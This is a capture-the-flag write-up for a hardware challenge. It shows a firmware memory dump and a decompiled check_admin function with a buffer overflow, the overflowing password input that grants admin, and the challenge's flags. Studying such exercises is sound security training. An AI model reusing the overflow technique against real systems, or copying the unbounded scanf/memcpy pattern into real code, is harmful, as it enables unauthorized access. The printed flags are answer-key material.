## Hardware challenge - Second part

### Catégorie 

Hardware 

### Points 

1000

### Format du flag 

Flag{...}

### Description

Honneur et gloire vous reviennent, valeureux champion ! Vous avez franchi 
avec bravoure le seuil de cet édifice numérique. À présent, il vous faut 
conquérir le trône de l'administrateur pour gouverner cet empire digital. 
Quêtez donc un stratagème, une ruse de guerre pour prouver votre droit de 
commandement. Conseil de sage: explorez les arcanes de l'application, utilisez 
ses sortilèges pour restaurer ce qui fut jadis perverti et corrompu. Là, dans 
les entrailles de cette bête de chiffres, peut-être dénicherez-vous la clef 
de votre ascension.

### Writeup

Once the first part of the challenge is solved, challenger will face a minimal 
fake shell like this:

``` 
**********************************************************************
          Welcome To Jeanne D'HACK OS Command Line Interface
                    Flag{H4rdw4r3_H4ck1n6_15_Fun}
**********************************************************************

For a list of supported command, type 'help'.
> help
Here is the list of available commands:
help		Print this help
status		Print current status of Jeanne D'HACK OS
read[addr] [len]	Read len bytes of memory starting at addr (usefull for debug)
write		Write to the memory
admin		Authentifcate as administrator
flag		Print the flag of the admin
exit		Exit command line interface
>
```

Now they can enter various commands including the `read` command that can help them 
to dump the entire firmware including the check function. Below there is an example
to read the firmware.

``` 
> read
Address (hex): 0x117F4
Size (hex): 0x100
80 b5 a0 b0 00 af 00 23
fb 67 14 48 00 f0 ce f8
4f f0 ff 32 4f f0 ff 33
39 1d 11 48 0f f0 9c fb
39 1d 07 f1 44 03 40 22
18 46 10 f0 c6 fb 4f f4
40 30 10 f0 77 fb 02 46
07 f1 44 03 4f f4 40 31
18 46 10 f0 7f fb 03 46
00 2b 01 d1 01 23 fb 67
f9 6f 0b 46 18 46 80 37
bd 46 80 bd 20 58 02 00
f0 09 00 20 01 48 0f f0
7b bb 00 bf 2c 58 02 00
70 b5 0c 4e bd f8 10 50
0b 49 10 46 32 68 1c 46
eb 18 93 42 29 44 06 dd
52 1b 10 f0 96 fb 34 68
64 1b 20 46 70 bd 22 46
10 f0 8f fb 00 23 33 60
f7 e7 00 bf 10 28 00 20
98 47 00 20 2d e9 78 41
10 4d 1c 46 2b 68 23 44
20 2b 90 46 17 dc 0e 4e
0e 49 06 22 30 46 10 f0
78 fb 22 46 41 46 b0 1d
10 f0 73 fb a0 1d 0a 49
02 22 30 44 10 f0 6d fb
2b 68 07 33 23 44 2b 60
20 46 bd e8 78 81 00 24
fa e7 00 bf 10 28 00 20
98 47 00 20 45 58 02 00
>
```

The `check_admin` function performs the following: 
``` C 
undefined4 check_admin(void)

{
  undefined4 pass_len;
  int equal;
  undefined buf1 [64];
  undefined buf2 [56];
  undefined4 res;
  
  res = 0;
  printf(PTR_s_Password:_00011850);
  scanf(DAT_00011854,buf1,0xffffffff,0xffffffff);
  memcpy(buf2,buf1,0x40);
  pass_len = strlen(0x30000);
  equal = strncmp(buf2,0x30000,pass_len);
  if (equal == 0) {
    res = 1;
  }
  return res;
}
```

This function will check for a password that is not accessible and which is not possible to 
brute force. But there is a very simple overflow during the copy that allow to change the value
of the return value. One can log as admin with the following password:

``` 
> admin
Password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Sucess
> flag
Welcome back Admin! Here is your flag:
Flag{Buff3r_0v3rfl0w_4r3_345y}
>
```


